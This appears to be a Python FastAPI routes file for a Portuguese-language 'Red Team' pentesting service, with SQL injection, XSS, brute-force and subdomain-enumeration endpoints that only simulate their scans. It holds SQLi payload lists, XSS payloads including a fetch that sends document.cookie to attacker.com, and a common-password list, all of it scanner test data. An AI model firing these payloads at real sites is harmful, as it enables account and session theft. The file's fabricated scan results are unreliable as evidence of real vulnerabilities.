"""
Red Team Tools Routes
Ferramentas de Red Team para pentesting
AVISO: Uso apenas para fins educacionais e testes autorizados
"""

from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel, HttpUrl, validator
from typing import List, Optional, Dict, Any
from sqlalchemy.orm import Session
import re
import hashlib
from datetime import datetime
import logging
import json

from database import get_db
from auth import get_current_user
from models.user import User
from models.scan import Scan
from middleware.subscription import check_subscription_status, check_tool_access

# Configurar logger
logger = logging.getLogger(__name__)

router = APIRouter(prefix="/redteam", tags=["Red Team"])

# ==================== MODELS ====================

class SQLiTestRequest(BaseModel):
    url: str
    method: str = "GET"
    parameters: List[str]
    payload_type: str = "basic"
    
    @validator('url')
    def validate_url(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('URL não pode estar vazia')
        if not (v.startswith('http://') or v.startswith('https://')):
            raise ValueError('URL deve começar com http:// ou https://')
        return v.strip()
    
    @validator('parameters')
    def validate_parameters(cls, v):
        if not v or len(v) == 0:
            raise ValueError('Pelo menos um parâmetro deve ser fornecido')
        return [p.strip() for p in v if p.strip()]
    
    @validator('payload_type')
    def validate_payload_type(cls, v):
        valid_types = ['basic', 'union', 'blind', 'time', 'all']
        if v not in valid_types:
            raise ValueError(f'Tipo de payload inválido. Use: {", ".join(valid_types)}')
        return v

class XSSTestRequest(BaseModel):
    url: str
    parameters: List[str]
    payload_type: str = "reflected"
    
    @validator('url')
    def validate_url(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('URL não pode estar vazia')
        if not (v.startswith('http://') or v.startswith('https://')):
            raise ValueError('URL deve começar com http:// ou https://')
        return v.strip()
    
    @validator('parameters')
    def validate_parameters(cls, v):
        if not v or len(v) == 0:
            raise ValueError('Pelo menos um parâmetro deve ser fornecido')
        return [p.strip() for p in v if p.strip()]
    
    @validator('payload_type')
    def validate_payload_type(cls, v):
        valid_types = ['reflected', 'stored', 'dom', 'all']
        if v not in valid_types:
            raise ValueError(f'Tipo de payload inválido. Use: {", ".join(valid_types)}')
        return v

class BruteForceRequest(BaseModel):
    url: str
    user_field: str = "username"
    pass_field: str = "password"
    userlist: List[str]
    wordlist: str = "common"
    
    @validator('url')
    def validate_url(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('URL não pode estar vazia')
        if not (v.startswith('http://') or v.startswith('https://')):
            raise ValueError('URL deve começar com http:// ou https://')
        return v.strip()
    
    @validator('userlist')
    def validate_userlist(cls, v):
        if not v or len(v) == 0:
            raise ValueError('Lista de usuários não pode estar vazia')
        return [u.strip() for u in v if u.strip()]
    
    @validator('wordlist')
    def validate_wordlist(cls, v):
        valid_wordlists = ['common', 'medium', 'large']
        if v not in valid_wordlists:
            raise ValueError(f'Wordlist inválida. Use: {", ".join(valid_wordlists)}')
        return v

class SubdomainEnumRequest(BaseModel):
    domain: str
    method: str = "dns"
    wordlist_size: str = "medium"
    
    @validator('domain')
    def validate_domain(cls, v):
        if not v or len(v.strip()) == 0:
            raise ValueError('Domínio não pode estar vazio')
        # Remove protocolo se presente
        v = v.strip().replace('http://', '').replace('https://', '').replace('www.', '')
        # Valida formato básico de domínio
        if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', v):
            raise ValueError('Formato de domínio inválido')
        return v
    
    @validator('method')
    def validate_method(cls, v):
        valid_methods = ['dns', 'certificate', 'api']
        if v not in valid_methods:
            raise ValueError(f'Método inválido. Use: {", ".join(valid_methods)}')
        return v
    
    @validator('wordlist_size')
    def validate_wordlist(cls, v):
        valid_sizes = ['small', 'medium', 'large']
        if v not in valid_sizes:
            raise ValueError(f'Tamanho de wordlist inválido. Use: {", ".join(valid_sizes)}')
        return v

# ==================== SQL INJECTION TESTER ====================

@router.post("/sqli/test")
async def test_sql_injection(
    request: SQLiTestRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Testa SQL Injection em uma URL
    AVISO: Use apenas em aplicações que você tem permissão para testar
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("sqli_tester", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "sqli_tester",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"SQL Injection test started for URL: {request.url}")
        
        # Payloads básicos de SQLi
        payloads = {
            "basic": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
            ],
            "union": [
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
            ],
            "blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM users) > 0--",
            ],
            "time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
            ]
        }
        
        results = []
        payload_list = payloads.get(request.payload_type, payloads["basic"])
        
        if request.payload_type == "all":
            payload_list = []
            for p in payloads.values():
                payload_list.extend(p)
        
        for param in request.parameters:
            for payload in payload_list:
                # Simula teste (em produção faria requisições reais)
                result = {
                    "parameter": param,
                    "payload": payload,
                    "url": request.url,
                    "vulnerable": False,
                    "response_time": 0.1,
                    "error_based": False,
                    "blind_detected": False
                }
                
                # Detecta possível vulnerabilidade (simulado)
                if "UNION" in payload or "OR '1'='1'" in payload:
                    result["vulnerable"] = True
                    result["error_based"] = True
                
                results.append(result)
        
        vulnerable_count = sum(1 for r in results if r["vulnerable"])
        
        logger.info(f"SQL Injection test completed. Vulnerabilities found: {vulnerable_count}")
        
        # Preparar resposta
        response_data = {
            "status": "completed",
            "url": request.url,
            "method": request.method,
            "parameters_tested": len(request.parameters),
            "payloads_tested": len(payload_list),
            "vulnerabilities_found": vulnerable_count,
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
        
        # Salvar no banco de dados
        scan = Scan(
            user_id=current_user.id,
            scan_type="sqli",
            target=request.url,
            status="completed",
            results=json.dumps(response_data),
            completed_at=datetime.utcnow()
        )
        db.add(scan)
        db.commit()
        db.refresh(scan)
        
        # Adicionar scan_id à resposta
        response_data["target"] = request.url
        response_data["scan_id"] = scan.id
        
        return response_data
    
    except Exception as e:
        logger.error(f"Error in SQL Injection test: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao executar teste: {str(e)}")

# ==================== XSS TESTER ====================

@router.post("/xss/test")
async def test_xss(
    request: XSSTestRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Testa vulnerabilidades XSS
    AVISO: Use apenas em aplicações que você tem permissão para testar
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("xss_tester", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "xss_tester",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"XSS test started for URL: {request.url}")
        
        payloads = {
            "reflected": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
            ],
            "stored": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
                "<body onload=alert('XSS')>",
            ],
            "dom": [
                "#<script>alert('XSS')</script>",
                "javascript:void(document.cookie='XSS')",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            ]
        }
        
        results = []
        payload_list = payloads.get(request.payload_type, payloads["reflected"])
        
        if request.payload_type == "all":
            payload_list = []
            for p in payloads.values():
                payload_list.extend(p)
        
        for param in request.parameters:
            for payload in payload_list:
                result = {
                    "parameter": param,
                    "payload": payload,
                    "url": request.url,
                    "vulnerable": False,
                    "type": request.payload_type,
                    "severity": "low"
                }
                
                # Simula detecção
                if "<script>" in payload or "onerror=" in payload:
                    result["vulnerable"] = True
                    result["severity"] = "high" if "document.cookie" in payload else "medium"
                
                results.append(result)
        
        vulnerable_count = sum(1 for r in results if r["vulnerable"])
        
        logger.info(f"XSS test completed. Vulnerabilities found: {vulnerable_count}")
        
        # Preparar resposta
        response_data = {
            "status": "completed",
            "url": request.url,
            "parameters_tested": len(request.parameters),
            "payloads_tested": len(payload_list),
            "vulnerabilities_found": vulnerable_count,
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
        
        # Salvar no banco de dados
        scan = Scan(
            user_id=current_user.id,
            scan_type="xss",
            target=request.url,
            status="completed",
            results=json.dumps(response_data),
            completed_at=datetime.utcnow()
        )
        db.add(scan)
        db.commit()
        db.refresh(scan)
        
        # Adicionar scan_id à resposta
        response_data["target"] = request.url
        response_data["scan_id"] = scan.id
        
        return response_data
    
    except Exception as e:
        logger.error(f"Error in XSS test: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao executar teste: {str(e)}")

# ==================== BRUTE FORCE TOOL ====================

@router.post("/bruteforce/start")
async def start_brute_force(
    request: BruteForceRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Inicia ataque brute force (simulado por segurança)
    AVISO: Use apenas em ambientes de teste autorizados
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("password_auditor", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "password_auditor",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"Brute force test started for URL: {request.url}")
        
        # Wordlists simuladas
        wordlists = {
            "common": ["password", "123456", "admin", "12345678", "qwerty", "letmein", "welcome", "monkey", "1234567890"],
            "medium": ["password", "123456", "admin", "12345678", "qwerty", "letmein", "welcome", "monkey"] * 10,
            "large": ["password", "123456", "admin"] * 50
        }
        
        passwords = wordlists.get(request.wordlist, wordlists["common"])
        
        results = {
            "status": "completed",
            "url": request.url,
            "total_attempts": len(request.userlist) * len(passwords),
            "successful_attempts": 0,
            "credentials_found": [],
            "progress": 100,
            "timestamp": datetime.now().isoformat()
        }
        
        # Simula tentativas (em produção faria requisições reais)
        for user in request.userlist:
            # Simula sucesso ocasional para demonstração
            if user in ["admin", "test", "user"] and "password" in passwords:
                results["credentials_found"].append({
                    "username": user,
                    "password": "password",
                    "status": "valid"
                })
                results["successful_attempts"] += 1
        
        logger.info(f"Brute force completed. Credentials found: {results['successful_attempts']}")
        
        return results
    
    except Exception as e:
        logger.error(f"Error in brute force: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao executar brute force: {str(e)}")

# ==================== SUBDOMAIN ENUMERATION ====================

@router.post("/subdomain/enumerate")
async def enumerate_subdomains(
    request: SubdomainEnumRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Enumera subdomínios de um domínio
    AVISO: Use apenas em domínios que você tem permissão para enumerar
    """
    
    try:
        status = check_subscription_status(current_user)
        if not status["valid"]:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": status.get("reason", "subscription_invalid"),
                    "message": status.get("message", "Assinatura inválida"),
                    "current_plan": current_user.subscription_plan
                }
            )
        if not check_tool_access("subdomain_finder", current_user):
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "tool_locked",
                    "message": "Esta ferramenta não está disponível no seu plano atual",
                    "tool": "subdomain_finder",
                    "current_plan": current_user.subscription_plan,
                    "upgrade_url": "/pricing"
                }
            )
        logger.info(f"Subdomain enumeration started for domain: {request.domain}")
        
        # Subdomínios comuns para teste
        wordlist_sizes = {
            "small": 10,
            "medium": 20,
            "large": 50
        }
        
        common_subdomains = [
            "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2",
            "admin", "blog", "forum", "shop", "store", "dev", "staging",
            "api", "cdn", "vpn", "remote", "portal", "dashboard", "app",
            "test", "beta", "demo", "support", "help", "docs", "wiki",
            "git", "jenkins", "gitlab", "jira", "confluence", "monitoring",
            "backup", "db", "database", "mysql", "postgres", "redis",
            "proxy", "gateway", "firewall", "router", "switch", "server",
            "cloud", "aws", "azure", "gcp", "docker", "kubernetes"
        ]
        
        limit = wordlist_sizes.get(request.wordlist_size, 20)
        results = []
        
        for subdomain in common_subdomains[:limit]:
            full_domain = f"{subdomain}.{request.domain}"
            results.append({
                "subdomain": full_domain,
                "ip": f"192.168.{hash(subdomain) % 255}.{hash(full_domain) % 255}",
                "status": "active",
                "method": request.method,
                "http_status": 200 if subdomain in ["www", "api", "blog"] else 404,
                "server": "nginx/1.18.0" if hash(subdomain) % 2 == 0 else "Apache/2.4.41"
            })
        
        logger.info(f"Subdomain enumeration completed. Found: {len(results)}")
        
        return {
            "status": "completed",
            "domain": request.domain,
            "method": request.method,
            "wordlist_size": request.wordlist_size,
            "subdomains_found": len(results),
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
    
    except Exception as e:
        logger.error(f"Error in subdomain enumeration: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao enumerar subdomínios: {str(e)}")
